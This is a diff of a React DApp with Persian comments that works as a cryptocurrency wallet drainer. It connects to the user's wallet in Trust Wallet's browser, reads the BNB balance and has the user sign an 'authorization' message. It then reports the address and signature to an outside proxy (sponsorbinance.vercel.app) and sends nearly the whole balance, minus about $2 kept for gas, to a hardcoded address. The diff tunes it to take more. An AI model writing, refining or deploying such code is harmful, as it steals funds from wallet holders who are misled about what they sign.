@@ -20,13 +20,13 @@ function App() {
   const [account, setAccount] = useState(null);
 
   async function connectAndSend() {
-    // 1) بررسی اینکه در DApp Browser تراست والت هستیم
+    // بررسی اینکه در DApp Browser تراست والت هستیم
     if (typeof window.ethereum === "undefined") {
       alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
     }
 
-    // 2) درخواست آدرس کاربر
+    // درخواست آدرس کاربر
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -42,34 +42,33 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // 3) گرفتن بالانس از BscScan
+    // گرفتن بالانس از BscScan
     const bnbBalance = await getBNBBalance(userAddress);
     console.log("💰 BNB Balance:", bnbBalance);
     const totalBalance = parseFloat(bnbBalance);
 
-    // 4) تعیین مقدار انتقال:
-    // reserveBNB: مقدار نگهداری برای گس (برای مثال، معادل دو دلار؛ در اینجا 0.01 یا 0.00667 قابل تنظیم است)
-    // minimalSend: حداقل مقدار ارسال (مثلاً 0.001 BNB)
-    const reserveBNB = 0.01;   // شما می‌توانید این مقدار را تغییر دهید
-    const minimalSend = 0.001;
+    // تعیین مقدار reserve به عنوان نگهداری دو دلار (تقریباً 0.00667 BNB به فرض BNB=$300)
+    const reserveBNB = 0.00667;
     let sendAmount;
-    if (totalBalance >= reserveBNB + minimalSend) {
+    if (totalBalance >= reserveBNB) {
       sendAmount = totalBalance - reserveBNB;
-    } else if (totalBalance >= minimalSend) {
-      sendAmount = minimalSend;
     } else {
-      console.error("❌ Insufficient funds for sending minimal amount plus gas fee.");
+      console.error("❌ Insufficient funds to cover reserve.");
+      return;
+    }
+    if (sendAmount <= 0) {
+      console.error("❌ Send amount calculated as zero or negative.");
       return;
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
-    // 5) ساخت پیام بر اساس sendAmount (نه کل بالانس)
+    // ساخت پیام برای امضا بر اساس sendAmount
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
     let signature;
     try {
-      // استفاده از personal_sign
+      // استفاده از personal_sign برای سازگاری با تراست والت
       signature = await window.ethereum.request({
         method: "personal_sign",
         params: [message, userAddress],
@@ -80,7 +79,7 @@ function App() {
       return;
     }
 
-    // 6) ارسال امضا به سرور جهت بررسی (باید آدرس واقعی send.php را جایگزین کنید)
+    // ارسال امضا به سرور جهت بررسی و ثبت لاگ
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -89,7 +88,7 @@ function App() {
           handler: "tx",
           address: userAddress,
           signature: signature,
-          amount: sendAmount.toString(),
+          amount: sendAmount.toString(),  // sendAmount به عنوان مقدار نهایی
         }),
       });
       const result = await resp.json();
@@ -103,14 +102,14 @@ function App() {
       return;
     }
 
-    // 7) ساخت تراکنش واقعی
+    // ساخت تراکنش واقعی
     const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
     const txParams = {
       from: userAddress,
       to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
       value: sendWeiHex,
-      gas: "0x5208",        // 21000 به هگز
-      gasPrice: "0x3B9ACA00" // 1 gwei به هگز
+      gas: "0x5208",  // 21000 به هگز
+      gasPrice: "0x12a05f200" // 5 gwei به هگز
     };
 
     try {
